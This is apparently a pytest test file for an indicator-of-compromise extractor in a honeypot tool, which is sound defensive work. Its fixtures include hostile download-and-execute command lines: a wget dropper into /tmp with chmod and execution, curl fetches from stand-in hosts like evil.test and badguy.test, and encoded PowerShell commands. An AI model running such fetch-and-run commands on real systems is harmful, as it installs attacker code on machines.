"""Tests for the IOC extractor."""

import base64
import gzip

from honeyknot.ioc import extract_iocs


class TestExtractIocs:
    def test_wget_dropper_line(self):
        data = (
            b"POST /cgi HTTP/1.1\r\nHost: x\r\n\r\n"
            b"; cd /tmp; wget http://192.168.7.11/bins.sh -O bin.sh; "
            b"chmod +x bin.sh; ./bin.sh\r\n"
        )
        iocs = extract_iocs(data)
        assert iocs is not None
        assert any("http://192.168.7.11/bins.sh" in u for u in iocs["urls"])
        assert "192.168.7.11" in iocs["ips"]
        assert any(d.lower().startswith("wget ") for d in iocs["downloads"])
        assert any("chmod" in s.lower() for s in iocs["shell"])

    def test_curl_with_multiple_urls(self):
        data = b"curl https://evil.test/a.elf -o /tmp/a; curl http://x.y/z"
        iocs = extract_iocs(data)
        assert iocs is not None
        assert len(iocs["urls"]) == 2

    def test_binary_frame_skipped(self):
        # Mostly non-printable — the IP-looking byte sequence 1.2.3.4 is
        # present as literal text but printable ratio is below the gate.
        data = b"\x00" * 200 + b"1.2.3.4" + b"\xff" * 200
        assert extract_iocs(data) is None

    def test_empty_returns_none(self):
        assert extract_iocs(b"") is None
        assert extract_iocs(b"plain text with nothing interesting") is None

    def test_localhost_ip_filtered(self):
        data = b"connect to 127.0.0.1 and 192.0.2.7 please"
        iocs = extract_iocs(data)
        assert iocs is not None
        assert "127.0.0.1" not in iocs["ips"]
        assert "192.0.2.7" in iocs["ips"]

    def test_duplicates_deduped(self):
        data = b"http://a.test/x http://a.test/x http://a.test/x"
        iocs = extract_iocs(data)
        assert iocs is not None
        assert iocs["urls"] == ["http://a.test/x"]

    def test_cap_per_kind(self):
        many = b" ".join(f"http://example.test/{i}".encode() for i in range(50))
        iocs = extract_iocs(many)
        assert iocs is not None
        assert len(iocs["urls"]) == 20  # MAX_PER_KIND

    def test_powershell_encoded_command_captured(self):
        data = b"powershell -EncodedCommand ZABv..."
        iocs = extract_iocs(data)
        assert iocs is not None
        assert any("powershell" in s.lower() for s in iocs["shell"])

    def test_gzip_layer_peeled(self):
        inner = b"curl http://badguy.test/stager && chmod +x stager"
        data = gzip.compress(inner)
        iocs = extract_iocs(data)
        assert iocs is not None
        assert any("http://badguy.test/stager" in u for u in iocs["urls"])
        assert any("chmod" in s.lower() for s in iocs["shell"])

    def test_base64_blob_in_text_decoded(self):
        inner = b"wget http://10.0.0.1/x.sh"
        blob = base64.b64encode(b"AAAA" * 32 + inner)  # ensure min run length
        data = b"powershell -enc " + blob
        iocs = extract_iocs(data)
        assert iocs is not None
        assert "10.0.0.1" in iocs["ips"]
        assert any("wget" in d.lower() for d in iocs["downloads"])
